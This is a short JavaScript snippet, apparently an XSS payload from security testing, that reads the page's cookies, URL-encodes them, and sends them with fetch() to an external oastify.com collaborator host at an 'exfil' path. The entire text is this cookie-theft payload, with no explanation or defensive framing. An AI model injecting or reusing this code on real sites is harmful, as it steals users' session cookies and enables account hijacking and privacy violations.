let cookie = document.cookie
let encodedCookie = encodeURIComponent(cookie)
fetch("https://ra5ckmibs18p35les05onli6qxwokg85.oastify.com/exfil?data=" + encodedCookie)
